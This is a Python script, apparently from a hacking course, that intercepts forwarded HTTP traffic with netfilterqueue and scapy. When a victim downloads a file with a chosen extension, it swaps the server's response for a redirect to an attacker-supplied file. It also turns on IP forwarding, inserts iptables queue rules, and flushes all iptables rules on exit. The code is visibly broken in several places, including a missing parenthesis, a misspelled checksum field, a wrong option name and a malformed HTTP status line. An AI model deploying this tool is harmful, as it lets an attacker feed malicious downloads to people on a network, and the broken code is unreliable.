#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-e", "--extension", dest="extension", help="Enter a file extension to replace")
parser.add_argument("-r", "--replacement", dest="replacement_file", help="Enter directory of replacement file")
option = parser.parse_args()

ack_list = []

def replace_file(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksm
    del packet[scapy.TCP].len

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if option.extension in scapy_packet[scapy.Raw].load:
                print("[+] " + option.extension + " packet")
                ack_list.append(scapy_packet[scapy.TCP].ack
        elif scapy_packet(scapy.TCP).sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                load = "HTTP:/1.1 301 Moved Permanently\nLocation: " + option.replacement + "\n\n"
                replace_file(scapy_packet, load)
                packet.set_payload(str(scapy_packet))

    packet.accept()

try:
    # For use on local machine
    # subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    # subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

    # For use on remote machine
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
